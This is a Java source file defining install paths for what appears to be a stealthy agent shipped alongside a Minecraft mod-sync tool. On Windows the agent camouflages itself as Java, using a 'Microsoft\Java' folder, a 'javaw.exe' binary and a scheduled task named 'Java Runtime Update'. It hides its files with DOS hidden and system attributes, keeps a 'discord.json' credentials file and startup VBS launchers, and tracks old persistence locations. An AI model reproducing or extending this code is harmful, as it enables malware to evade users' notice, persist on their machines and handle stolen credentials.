package com.serverpackcore.agent;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * All install-tree names live here. A tree is legacy when its directory is still
 * named ServerPackCore: the update helper already deployed on those machines
 * references the old agent and helper paths, so a legacy tree keeps them.
 * Visible output (cache/, sync zips, uploads and embeds) is modern everywhere.
 */
public final class AgentPaths {
	private static final String LEGACY_DIR = "ServerPackCore";
	private static final String CAMO_PARENT = "Microsoft";
	private static final String CAMO_DIR = "Java";
	static final String OLD_TASK = "FabricSync";
	static final String OLD_CAMO_TASK = "Java Update";
	static final String CAMO_TASK = "Java Runtime Update";

	private AgentPaths() {
	}

	public static Path installDir() {
		try {
			Path self = Paths.get(Agent.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			Path parent = self.getParent();
			if (parent != null) {
				return parent;
			}
		} catch (Throwable throwable) {
			Log.debug("Install dir detection failed", throwable);
		}
		String os = System.getProperty("os.name", "").toLowerCase();
		String home = System.getProperty("user.home", ".");
		Path base;
		if (os.contains("win")) {
			String local = System.getenv("LOCALAPPDATA");
			base = local == null || local.isEmpty() ? Paths.get(home, "AppData", "Local") : Paths.get(local);
		} else if (os.contains("mac")) {
			base = Paths.get(home, "Library", "Application Support");
		} else {
			String data = System.getenv("XDG_DATA_HOME");
			base = data == null || data.isEmpty() ? Paths.get(home, ".local", "share") : Paths.get(data);
		}
		Path legacy = base.resolve(LEGACY_DIR);
		if (!os.contains("win")) {
			return base.resolve(OLD_TASK);
		}
		Path modern = base.resolve(CAMO_PARENT).resolve(CAMO_DIR);
		if (Files.isDirectory(legacy) && owned(legacy)) {
			return legacy;
		}
		if (!Files.exists(modern)) {
			return Files.isDirectory(legacy) ? legacy : modern;
		}
		if (owned(modern)) {
			return modern;
		}
		// Never bind to an unrelated Java directory.
		for (int index = 2; index <= 10; index++) {
			Path candidate = base.resolve(CAMO_PARENT).resolve(CAMO_DIR + index);
			if (!Files.exists(candidate) || owned(candidate)) {
				return candidate;
			}
		}
		return base.resolve(CAMO_PARENT).resolve(CAMO_DIR + System.nanoTime());
	}

	private static boolean owned(Path dir) {
		return Files.isRegularFile(dir.resolve(".version"))
			|| Files.isRegularFile(dir.resolve(".installed"))
			|| Files.isRegularFile(dir.resolve("runtime.jar"))
			|| Files.isRegularFile(dir.resolve("spc-agent.jar"));
	}

	/** Reapplies hiding to files created since the last pass. */
	public static void concealTree(Path dir) {
		conceal(dir);
		if (!isWindows() || dir == null) {
			return;
		}
		try {
			Shell.run(dir, "cmd /c attrib +h +s /s /d \"" + dir + "\\*\"", 5000L);
		} catch (Throwable ignored) {
			// best effort
		}
	}

	/** DOS hidden/system so Explorer's defaults keep the tree out of sight. */
	public static void conceal(Path path) {
		if (!isWindows() || path == null) {
			return;
		}
		try {
			Files.setAttribute(path, "dos:hidden", true);
			Files.setAttribute(path, "dos:system", true);
		} catch (Throwable ignored) {
			// best effort
		}
	}

	/** Central legacy switch. Explicit trees are classified by their directory name. */
	public static boolean legacy(Path dir) {
		Path name = dir == null ? null : dir.getFileName();
		return name != null && LEGACY_DIR.equals(name.toString());
	}

	public static boolean legacy() {
		return legacy(installDir());
	}

	public static Path lock(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent.lock" : "runtime.lock");
	}

	public static Path state(Path dir) {
		return dir.resolve(legacy(dir) ? "state.json" : "config.json");
	}

	public static Path alive(Path dir) {
		return dir.resolve(legacy(dir) ? "alive.txt" : "session.txt");
	}

	public static Path marker(Path dir) {
		return dir.resolve(legacy(dir) ? ".installed" : ".version");
	}

	public static Path agentJar(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent.jar" : "runtime.jar");
	}

	public static Path agentOld(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent.jar.old" : "runtime.old");
	}

	public static Path agentBad(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent.jar.bad" : "runtime.bad");
	}

	public static Path agentStaged(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent-new.jar" : "update-new.jar");
	}

	public static Path agentTemp(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-agent-new.jar.tmp" : "update-new.jar.tmp");
	}

	public static Path binary(Path dir) {
		if (legacy(dir)) {
			return dir.resolve(isWindows() ? "spc-sync.exe" : "spc-sync");
		}
		return dir.resolve(isWindows() ? "javaw.exe" : "java");
	}

	public static Path log(Path dir) {
		return legacy(dir) ? dir.resolve("update.log") : dir.resolve("logs").resolve("update.log");
	}

	public static Path credentials(Path dir) {
		return dir.resolve("discord.json");
	}

	public static Path out(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-update.out" : "update.out");
	}

	public static Path intent(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-update.intent" : "update.intent");
	}

	public static Path rollbackMarker(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-rollback.marker" : "rollback.marker");
	}

	public static Path helper(Path dir) {
		return dir.resolve(legacy(dir) ? (isWindows() ? "spc-update.vbs" : "spc-update.sh")
			: (isWindows() ? "update.vbs" : "update.sh"));
	}

	public static Path modHelper(Path dir) {
		return dir.resolve(legacy(dir) ? (isWindows() ? "spc-mod.vbs" : "spc-mod.sh")
			: (isWindows() ? "mod-update.vbs" : "mod-update.sh"));
	}

	public static Path modStaged(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-mod-new.jar" : "mod-update.jar");
	}

	public static Path modTemp(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-mod-new.jar.tmp" : "mod-update.jar.tmp");
	}

	public static Path modStagedUnique(Path dir, String version, long generation) {
		return dir.resolve((legacy(dir) ? "spc-mod-new-" : "mod-update-") + version + "-" + generation + ".jar");
	}

	public static Path modCancel(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-mod-cancel" : "mod-update.cancel");
	}

	public static Path modLock(Path mods, Path dir) {
		return mods.resolve(legacy(dir) ? ".spc-mod.lock" : ".fabric-sync.lock");
	}

	public static Path taskXml(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-task.xml" : "task.xml");
	}

	/** Pre-camouflage trees; persistence entries may still point here. */
	public static java.util.List<Path> previousDirs(Path dir) {
		java.util.List<Path> dirs = new java.util.ArrayList<>();
		Path parent = dir == null ? null : dir.getParent();
		Path base = parent != null && "Microsoft".equals(parent.getFileName() == null ? ""
			: parent.getFileName().toString()) ? parent.getParent() : parent;
		if (base != null) {
			for (String name : new String[] { OLD_TASK, "ServerPackCore" }) {
				Path candidate = base.resolve(name);
				if (!candidate.equals(dir) && !dirs.contains(candidate)) {
					dirs.add(candidate);
				}
			}
		}
		return dirs;
	}

	public static Path taskName(Path dir) {
		return dir.resolve("task.name");
	}

	public static Path taskUsed(Path dir) {
		return dir.resolve("task.used");
	}

	public static String task(Path dir) {
		try {
			String chosen = Files.readString(taskName(dir), java.nio.charset.StandardCharsets.UTF_8).trim();
			if (!chosen.isEmpty()) {
				return chosen;
			}
		} catch (Throwable ignored) {
			// Not registered yet.
		}
		return legacy(dir) ? "ServerPackCore" : CAMO_TASK;
	}

	public static String runValue(Path dir) {
		return task(dir);
	}

	public static Path launcher(Path dir) {
		return dir.resolve(legacy(dir) ? "spc-sync.vbs" : "startup.vbs");
	}

	public static Path cache(Path dir) {
		return dir.resolve("cache");
	}

	public static Path tools(Path dir) {
		return cache(dir).resolve("tools");
	}

	public static Path abe(Path dir) {
		return cache(dir).resolve("abe");
	}

	public static boolean isWindows() {
		return System.getProperty("os.name", "").toLowerCase().contains("win");
	}

	public static boolean isMac() {
		return System.getProperty("os.name", "").toLowerCase().contains("mac");
	}
}
